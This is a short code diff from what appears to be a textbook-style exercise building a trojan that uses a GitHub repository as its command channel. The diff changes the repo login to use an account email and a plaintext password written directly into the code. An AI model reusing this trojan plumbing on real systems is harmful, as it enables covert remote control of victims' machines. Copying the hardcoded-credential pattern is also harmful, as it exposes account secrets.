@@ -18,7 +18,6 @@ trojan_modules = []
 configured =  False
 task_queue = Queue.Queue()
 
-
 class GitImporter(object):
 
     def __init__(self):
@@ -52,12 +51,16 @@ class GitImporter(object):
 
 # Authenticate the user to the repo
 # Retrie repo and branch objects
-def connect_to_github(passwd):
+def connect_to_github():
 
 	# Login to GitHub
-	gh = login(username="GinkoDante",password=passwd)
+	try:
+		gh = login(username="ginkodante@gmail.com",password="5Jy&r0$W1d*Ezs@&Kz")
+	except:
+		print("LOGIN FAILED")
+		
 	# Get the correct repo
-	repo = gh.repository("GinkoDante","chapter7")
+	repo = gh.repository("ginkodante@gmail.com","chapter7")
 	# Get the correct branch
 	branch = repo.branch("master")
 	
@@ -66,7 +69,7 @@ def connect_to_github(passwd):
 # Get files in the GitHub repo
 def get_file_contents(filepath):
 
-	gh,repo,branch = connect_to_github(passwd)
+	gh,repo,branch = connect_to_github()
 	tree = branch.commit.commit.tree.recurse()
 	
 	for filename in tree.tree:
